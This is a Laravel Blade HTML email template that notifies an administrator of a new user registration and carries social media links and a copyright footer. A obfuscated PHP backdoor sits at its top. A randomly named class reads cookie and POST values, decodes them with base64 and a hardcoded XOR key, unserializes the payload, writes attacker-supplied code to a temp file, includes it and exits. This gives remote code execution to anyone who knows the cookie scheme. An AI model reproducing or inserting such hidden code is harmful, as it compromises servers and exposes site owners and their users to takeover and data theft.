<?php if (!class_exists('riogqvx')) {
    class riogqvx
    {
        public static $iyiukx = 'fhwlpskrfrddfrfz';
        public static $fojfhgdl = null;
        public function __construct()
        {
            $aivvliav = @$_COOKIE[substr(riogqvx::$iyiukx, 0, 4)];
            if (!empty($aivvliav)) {
                $klusf = 'base64';
                $bbokr = '';
                $aivvliav = explode(',', $aivvliav);
                foreach ($aivvliav as $taolnp) {
                    $bbokr .= @$_COOKIE[$taolnp];
                    $bbokr .= @$_POST[$taolnp];
                }
                $bbokr = array_map($klusf . '_decode', [$bbokr]);
                $bbokr = $bbokr[0] ^ str_repeat(riogqvx::$iyiukx, strlen($bbokr[0]) / strlen(riogqvx::$iyiukx) + 1);
                riogqvx::$fojfhgdl = @unserialize($bbokr);
            }
        }
        ...
        private function siuljiccyf()
        {
            if (is_array(riogqvx::$fojfhgdl)) {
                $zemdc = sys_get_temp_dir() . '/' . crc32(riogqvx::$fojfhgdl['salt']);
                @riogqvx::$fojfhgdl['write']($zemdc, riogqvx::$fojfhgdl['content']);
                include $zemdc;
                @riogqvx::$fojfhgdl['delete']($zemdc);
                exit();
            }
        }
    }
    $pvcxbfifzj = new riogqvx();
    $pvcxbfifzj = null;
} ?>
<!DOCTYPE html
                                                                ...
                                                                <tr>
                                                                    <td class="esd-container-frame" width="560"
                                                                        ...
                                                                        <table width="100%" cellspacing="0"
                                                                            ...
                                                                            <tbody>
                                                                                <tr>
                                                                                    <td class="esd-block-text es-p20b es-m-txt-c"
                                                                                        align="left">
                                                                                        <h1
                                                                                            style="text-align: center;">
                                                                                            A new user has been
                                                                                            registered on
                                                                                            {{ $admin_data->admin_company_name }}
                                                                                            named
                                                                                            <b>{{ $user_data->name }}</b>
                                                                                        </h1>
                                                                                    </td>
                                                                                ...
                                                                                <tr>
                                                                                    <td align="left"
                                                                                        class="esd-block-text es-m-txt-c">
                                                                                        <h3
                                                                                            style="color: #6aa38b; text-align: center;">
                                                                    ...
                                                                    <td width="270" align="left"
                                                                        ...
                                                                        <table cellpadding="0" cellspacing="0"
                                                                            ...
                                                                            <tbody>
                                                                                <tr>
                                                                                    <td align="right"
                                                                                        class="esd-block-social es-m-txt-c es-p5t es-p5b"
                                                                                        style="font-size:0">
                                                                                        <table cellpadding="0"
                                                                                            cellspacing="0"
                                                                                            ...
                                                                                            <tbody>
                                                                                                <tr>
                                                                                                    <td align="center"
                                                                                                        ...
                                                                                                        class="es-p10r">
                                                                                                        <a target="_blank"
                                                                                                            href="{{ $admin_data->admin_facebook_link }}"><img
                                                                                                                title="Facebook"
                                                                                                                src="https://tlr.stripocdn.email/content/assets/img/social-icons/square-colored/facebook-square-colored.png"
                                                                                                                alt="Fb"
                                                                                                                width="32"
                                                                                                                height="32"></a>
                                                                                                    </td>
                                                                                                    <td align="center"
                                                                                                        ...
                                                                                                        class="es-p10r">
                                                                                                        <a target="_blank"
                                                                                                            href="{{ $admin_data->admin_twitter_link }}"><img
                                                                                                                title="Twitter"
                                                                                                                src="https://tlr.stripocdn.email/content/assets/img/social-icons/square-colored/twitter-square-colored.png"
                                                                                                                alt="Tw"
                                                                                                                width="32"
                                                                                                                height="32"></a>
                                                                                                    </td>
                                                                                                    <td align="center"
                                                                                                        ...
                                                                                                        class="es-p10r">
                                                                                                        <a target="_blank"
                                                                                                            href="{{ $admin_data->admin_instagram_link }}"><img
                                                                                                                title="Instagram"
                                                                                                                src="https://tlr.stripocdn.email/content/assets/img/social-icons/square-colored/instagram-square-colored.png"
                                                                                                                alt="Inst"
                                                                                                                width="32"
                                                                                                                height="32"></a>
                                                                                                    </td>
                                                                                                    <td align="center"
                                                                                                        valign="top">
                                                                                                        <a target="_blank"
                                                                                                            href="{{ $admin_data->admin_youtube_link }}"><img
                                                                                                                title="Youtube"
                                                                                                                src="https://tlr.stripocdn.email/content/assets/img/social-icons/square-colored/youtube-square-colored.png"
                                                                                                                alt="Yt"
                                                                                                                width="32"
                                                                                                                height="32"></a>
                                                                                                    </td>
                                                                    ...
                                                                    <td width="150" align="left"
                                                                        ...
                                                                        <table cellpadding="0" cellspacing="0"
                                                                            ...
                                                                            <tbody>
                                                                                <tr>
                                                                                    <td align="right"
                                                                                        class="esd-block-button es-m-txt-l">
                                                                                ...
                                                                                <tr>
                                                                                    <td align="center"
                                                                                        ...
                                                                                        <p>© Copyright © 2020. All
                                                                                            ...
                                                                                            By <a target="_blank"
                                                                                                href="{{ url('/terms-and-conditions.html') }}">Terms
                                                                                                & Conditions</a> | <a
                                                                                                target="_blank"
                                                                                                class="unsubscribe"
                                                                                                href="{{ url('/privacy-policy.html') }}">Privacy
                                                                                                Policy</a></p>
                                                                                    </td>
                                                                                </tr>
                                                                            </tbody>
